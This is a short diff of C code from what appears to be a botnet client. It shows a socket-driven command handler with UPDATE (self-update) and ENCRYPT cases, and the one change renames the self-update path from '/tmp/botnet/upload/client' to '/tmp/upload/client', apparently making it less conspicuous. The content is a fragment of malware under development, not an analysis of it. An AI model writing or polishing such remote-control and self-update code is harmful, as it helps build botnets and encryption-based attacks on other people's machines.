@@ -173,7 +173,7 @@ void receive_and_process_message(int sockfd, int argc, char *argv[]) {
             break;
         case UPDATE:
             output_log("Preparing for UPDATE request\n", LOG_DEBUG, LOG_TO_CONSOLE);
-            perform_self_update("/tmp/botnet/upload/client", sockfd, argc, argv);
+            perform_self_update("/tmp/upload/client", sockfd, argc, argv);
             break;
         case ENCRYPT:
             output_log("Performing ENCRYPT request\n", LOG_DEBUG, LOG_TO_CONSOLE);
